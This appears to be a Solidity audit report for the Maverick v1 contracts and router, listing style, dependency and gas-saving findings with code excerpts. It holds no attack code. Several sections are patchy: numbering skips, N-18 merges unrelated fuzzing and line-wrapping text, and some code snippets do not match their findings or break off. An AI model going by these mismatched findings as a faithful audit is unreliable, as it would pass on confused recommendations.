Total: 24 issues

## [N-01] Critical Address Changes Should Use Two-step Procedure

The critical procedures should be a two-step process.

```solidity
2 results - 2 files

maverick-v1/contracts/models/Factory.sol:
  40:     function setOwner(address _owner) external {
  41          require(msg.sender == owner && _owner != address(0), "Factory:NOT_ALLOWED");

maverick-v1/contracts/models/Position.sol:
  22  
  23:     function setMetadata(IPositionMetadata _metadata) external onlyOwner {
  24          metadata = _metadata;

```

### Recommendation

Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.


## [N-02] Initial value check is missing in Set Functions

**Context:**
7 results 1 files

```solidity

5 results - 4 files

maverick-v1/contracts/models/Factory.sol:
  32  
  33:     function setProtocolFeeRatio(uint16 _protocolFeeRatio) external {
  34          require(msg.sender == owner, "Factory:NOT_ALLOWED");

  39  
  40:     function setOwner(address _owner) external {
  41          require(msg.sender == owner && _owner != address(0), "Factory:NOT_ALLOWED");

maverick-v1/contracts/models/Pool.sol:
  331  
  332:     function setProtocolFeeRatio(uint16 _protocolFeeRatio) internal {
  333          require(_protocolFeeRatio <= ONE_3_DECIMAL_SCALE);

maverick-v1/contracts/models/Position.sol:
  22  
  23:     function setMetadata(IPositionMetadata _metadata) external onlyOwner {
  24          metadata = _metadata;

maverick-v1/contracts/models/PositionMetadata.sol:
  16  
  17:     function setBaseURI(string memory _baseURI) external onlyOwner {
  18          baseURI = _baseURI;

```
Checking whether the current value and the new value are the same should be added.

## [N-03] Critical dependencies such as OpenZeppelin should use the latest version

```js
maverick-v1/package.json:
  69    },
  70:   "dependencies": {
  71:     "@openzeppelin/contracts": ">=4.1.0 <4.8.0",

```

As shown above, it is safer to specify the latest version definitively, rather than intermittently specified version dependencies

## [N-04] Not using the named return variables anywhere in the function is confusing

Within the scope of the project, it is observed that this is not followed in general, the following codes can be given as an example

```solidity

4 results - 4 files

maverick-v1/contracts/libraries/Delta.sol:

  40:     }

  66:             if (bytes(_data).length == 0) {
  67:                 revert("Invalid Swap");
  68:             }

  44:         SwapCallbackData memory data = SwapCallbackData({tokenIn: tokenAIn ? pool.tokenA() : pool.tokenB(), tokenOut: tokenAIn ? pool.tokenB() : pool.tokenA(), payer: msg.sender});
  45:         return pool.swap(recipient, amount, tokenAIn, exactOutput, 0, abi.encode(data));
  46:     }


```

### Recommendation

Consider adopting a consistent approach to return values throughout the codebase by removing all named return variables, explicitly declaring them as local variables, and adding the necessary return statements where appropriate. This would improve both the explicitness and readability of the code, and it may also help reduce regressions during future code refactors.

## [N-05] Use a single file for all system-wide constants

There are many addresses and constants used in the system. It is recommended to put the most used ones in one file (for example constants.sol, use inheritance to access these values).

This will help with readability and easier maintenance for future changes. 

constants.sol

Use and import this file in contracts that require access to these values. This is just a suggestion, in some use cases this may result in higher gas usage in the distribution

## [N-06] NatSpec comments should be increased in contracts

It is recommended that all Solidity contracts are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation.

In complex projects such as DeFi, the interpretation of all functions and their arguments and returns is important for code readability and auditability.

https://docs.soliditylang.org/en/v0.8.15/natspec-format.html

### Recommendation
NatSpec comments should be increased in contracts.

## [N-07] For functions, follow Solidity standard naming conventions

**Context:**

All Contract `internal` functions.

The above codes don't follow Solidity's standard naming convention:

internal and private functions : the mixedCase format starting with an underscore 

(_mixedCase starting with an underscore)


## [N-08] `Function writing` that does not comply with the `Solidity Style Guide`

**Context:**
All Contracts

**Description:**

Order of Functions; ordering helps readers identify which functions they can call and to find the constructor and fallback definitions easier. But there are contracts in the project that do not comply with this.

https://docs.soliditylang.org/en/v0.8.17/style-guide.html

Functions should be grouped according to their visibility and ordered:

constructor

receive function (if exists)

fallback function (if exists)

external

public

internal

private

within a grouping, place the view and pure functions last

## [N-09] Add a timelock to critical functions

It is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious owner making a sandwich attack on a user).

Consider adding a timelock to:

  16  
  17:     function setBaseURI(string memory _baseURI) external onlyOwner {
  18          baseURI = _baseURI;
```

## [N-10] Use a more recent version of Solidity

**Context:**

All contracts

**Description:**

For security, it is best practice to use the latest Solidity version.

For the security fix list in the versions:
https://github.com/ethereum/solidity/blob/develop/Changelog.md


### Recommendation

Old version of Solidity is used. Newer version can be used `(0.8.17)`.

## [N-11] Solidity compiler optimizations can be problematic

```js

2 results - 2 files

maverick-v1/hardhat.config.ts:
  24            optimizer: {
  25:             enabled: true,
  26              runs: 80,

router-v1/hardhat.config.ts:
  25            optimizer: {
  26:             enabled: true,
  27              runs: 20
```

Protocol has enabled optional compiler optimizations in Solidity.

There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. 

Therefore, it is unclear how well they are being tested and exercised.

High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. 

Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported.

A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe.

It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.

Exploit Scenario

A latent or future bug in Solidity compiler optimizationsâ€”or in the Emscripten transpilation to solc-jsâ€”causes a security vulnerability in the contracts.


### Recommendation
Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug.
Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.

## [N-12] Insufficient coverage

The test coverage rate of the project is 81%. Testing all functions is best practice in terms of security criteria.

## [N-13] For modern and more readable code; update import usages

**Context:**

```solidity

128 results - 32 files

```


**Description:**

Solidity code is also cleaner in another way that might not be noticeable: the struct Point. We were importing it previously with global import but not using it. The Point struct `polluted the source code` with an unnecessary object we were not using because we did not need it. 

This was breaking the rule of modularity and modular programming: `only import what you need` Specific imports with curly braces allow us to apply this rule better.

### Recommendation
`import {contract1 , contract2} from "filename.sol";`

A good example from the ArtGobblers project:
```js
import {Owned} from "solmate/auth/Owned.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";
import {LibString} from "solmate/utils/LibString.sol";
import {MerkleProofLib} from "solmate/utils/MerkleProofLib.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {ERC1155, ERC1155TokenReceiver} from "solmate/tokens/ERC1155.sol";
import {toWadUnsafe, toDaysWadUnsafe} from "solmate/utils/SignedWadMath.sol";
```
## [N-14] `WETH` address definition can be use _directly_

**Context:**

```solidity
1 result - 1 file

router-v1/contracts/Router.sol:
  45      /// @inheritdoc IRouter
  46:     IWETH9 public immutable override WETH9;
```

**Description:**

WETH is a wrap Ether contract with a specific address in the Ethereum network, giving the option to define it may cause false recognition, it is healthier to define it directly.

Advantages of defining a specific contract directly:
- It saves gas,
- Prevents incorrect argument definition, 
- Prevents execution on a different chain and re-signature issues,

WETH Address : 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2


### Recommendation
```js
address private constant WETH = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;
```
## [N-15] Floating pragma

Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.
https://swcregistry.io/docs/SWC-103

Floating Pragma List: 
pragma ^0.8.0   (all contracts)

### Recommendation
Lock the pragma version and also consider known bugs (https://github.com/ethereum/solidity/releases) for the compiler version that is chosen.

## [N-16] Add to indexed parameter for countable Events

```solidity
maverick-v1/contracts/interfaces/IFactory.sol:

```

## [N-17] Include return parameters in NatSpec comments

**Context:**

All Contracts

**Description:**

It is recommended that Solidity contracts are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation. In complex projects such as Defi, the interpretation of all functions and their arguments and returns is important for code readability and auditability.

https://docs.soliditylang.org/en/v0.8.15/natspec-format.html

### Recommendation
Include return parameters in NatSpec comments

_Recommendation  Code Style: (from Uniswap3)_
```js
    /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position
    /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback
    /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends
    /// on tickLower, tickUpper, the amount of liquidity, and the current price.
    /// @param recipient The address for which the liquidity will be created
    /// @param tickLower The lower tick of the position in which to add liquidity
    /// @param tickUpper The upper tick of the position in which to add liquidity
    /// @param amount The amount of liquidity to mint
    /// @param data Any data that should be passed through to the callback
    /// @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback
    /// @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback
    function mint(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount,
        bytes calldata data
    ) external returns (uint256 amount0, uint256 amount1);
```

## [N-18] Omissions in Events

Throughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, some events are missing important parameters.

The events should include the new value and old value where possible:

### Recommendation

Multiline output parameters and return statements should follow the same style recommended for wrapping long lines found in the Maximum Line Length section.

In total 1 contracts, 2 unchecked are used, the functions used are critical. For this reason, there must be fuzzing tests in the tests of the project. Not seen in tests.

### Recommendation

Use Fuzzing test like Echidna.

As Alberto Cuesta Canada said:
_Fuzzing is not easy, the tools are rough, and the math is hard, but it is worth it. Fuzzing gives me a level of confidence in my smart contracts that I didnâ€™t have before. Relying just on unit testing anymore and poking around in a testnet seems reckless now._

## [N-22] Take advantage of Custom Error's return value property

An important feature of Custom Error is that values such as address, tokenID, msg.value can 
be written inside the `()` sign, this kind of approach provides a serious advantage in 
debugging and examining the revert details of dapps such as tenderly.

For Example;

```diff
1 result - 1 file

router-v1/contracts/libraries/Multicall.sol:
- 18:                if (result.length < 68) revert();
+ 18:                if (result.length < 68) revert(result.length);
```

## [N-23] Some `require` descriptions are not clear

Some `require` error descriptions below return results like A, B , C.

1. It does not comply with the general `require` error description model of the project (Either all of them should be debugged in this way, or all of them should be explained with a string not exceeding 32 bytes.)

2.  For debug dapps like Tenderly, these debug messages are important, this allows the user to see the reasons for revert practically.

## [N-24] Danger "while" loop

```solidity

router-v1/contracts/Router.sol:
  142      /// @inheritdoc IRouter
  143:     function exactInput(ExactInputParams memory params) external payable override checkDeadline(params.deadline) returns (uint256 amountOut) {
  144:         address payer = msg.sender;
  145: 
  146:         while (true) {
  147:             bool stillMultiPoolSwap = params.path.hasMultiplePools();
  148: 
  149:             params.amountIn = exactInputInternal(
  150:                 params.amountIn,
  151:                 stillMultiPoolSwap ? address(this) : params.recipient,
  152:                 0,
  153:                 SwapCallbackData({path: params.path.getFirstPool(), payer: payer, exactOutput: false})
  154:             );
  155: 
  156:             if (stillMultiPoolSwap) {
  157:                 payer = address(this);
  158:                 params.path = params.path.skipToken();
  159:             } else {
  160:                 amountOut = params.amountIn;
  161:                 break;
  162:             }
  163:         }
  164: 
  165:         require(amountOut >= params.amountOutMinimum, "Too little received");
  166:     }

```

Firstly, the conditional part is evaluated:

a) If the condition evaluates to true, the instructions inside the loop (defined inside the brackets { ... }) get executed.

b) Once the code reaches the end of the loop body (= the closing curly brace }, it will jump back up to the conditional part).

c) The code inside the while loop body will keep executing over and over again until the conditional part turns false.

For loops are more associated with iterations. While loop instead are more associated with repetitive tasks. Such tasks could potentially be infinite if the while loop body never affects the condition initially checked.

Therefore, they should be used with care.

Because it is inside the `exactInput()` function, which is an external function, a DOS attack can create spam and break the function, especially in shallow liquidity.

## [S-01] Make the Test Context with Solidity

It's crucial to write tests with possibly 100% coverage for smart contract systems.

It is recommended to write appropriate tests for all possible code streams and especially for extreme cases.

But the other important point is the test context, tests written with solidity are safer, it is recommended to focus on tests with Foundry

## [S-02] Generate perfect code headers every time

**Description:**
I recommend using header for Solidity code layout and readability

Total: 159 instances over 19 issues with **9460 gas** saved

Gas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.

## [G&#x2011;01]  State variables only set in the constructor should be declared `immutable`
Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**). 

In the example below, `twa.lookback` never changes, so it should be pulled out of the struct and converted to an immutable value. If you still want the struct to contain the lookback, create a private version of the twa struct, for storage purposes, that does _not_ have the `lookback`, and use that to build the original twa structs on the fly, when requested, and pass the value as an argument to `TWA.getTwa()` when it's called. Since this is in the hot path, you'll save a lot of gas.

```
`Pool.sol#L77`

## [G&#x2011;02]  Structs can be packed into fewer storage slots
Each slot saved can avoid an extra Gsset (**20000 gas**) for the first setting of the struct. Subsequent reads as well as writes have smaller gas savings

## [G&#x2011;03]  Using `storage` instead of `memory` for structs/arrays saves gas
When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct

## [G&#x2011;04]  Avoid contract existence checks by using low level calls
Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence

## [G&#x2011;11]  Optimize names to save gas
`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)

## [G&#x2011;16]  Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead
> When using elements that are smaller than 32 bytes, your contractÃ¢â‚¬â„¢s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.

https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html
Each operation involving a `uint8` costs an extra [**22-28 gas**](https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977) (depending on whether the other operand is also a variable of type `uint8`) as compared to ones involving `uint256`, due to the compiler having to clear the higher bits of the memory word before operating on the `uint8`, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.

Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case.

## [G&#x2011;19]  Functions guaranteed to revert when called by normal users can be marked `payable`
If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.

Total: 69 instances over 7 issues with **17653 gas** saved

Gas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.

## [G&#x2011;20]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas
When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. 

If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one.

Note that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved.

## [G&#x2011;21]  State variables should be cached in stack variables rather than re-reading them from storage
The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.

## [G&#x2011;22]  `<array>.length` should not be looked up in every loop of a `for`-loop
The overheads outlined below are _PER LOOP_, excluding the first loop
* storage arrays incur a Gwarmaccess (**100 gas**)
* memory arrays use `MLOAD` (**3 gas**)
* calldata arrays use `CALLDATALOAD` (**3 gas**)

Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset.

## [G&#x2011;23]  Using `bool`s for storage incurs overhead
```solidity
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past.

## [G&#x2011;26]  Use custom errors rather than `revert()`/`require()` strings to save gas
Custom errors are available from solidity version 0.8.4.

Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.
